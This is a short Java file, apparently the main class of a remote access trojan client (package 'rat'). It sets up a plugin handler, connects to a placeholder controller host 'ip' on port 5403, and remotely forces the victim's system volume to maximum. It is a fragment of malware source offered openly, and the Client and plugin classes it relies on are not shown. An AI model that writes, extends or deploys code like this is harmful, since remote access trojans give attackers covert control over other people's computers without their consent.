package rat;

import rat.packets.PluginHandler;
import rat.plugins.volume.VolumeUtil;

public class ClientMain
{
    public static PluginHandler pluginHandler;

    public static void main(String[] args)
    {
        pluginHandler = new PluginHandler();
        new Client("ip", 5403);

        VolumeUtil.setVolume(100);
    }

    public static PluginHandler getPluginHandler()
    {
        return pluginHandler;
    }
}
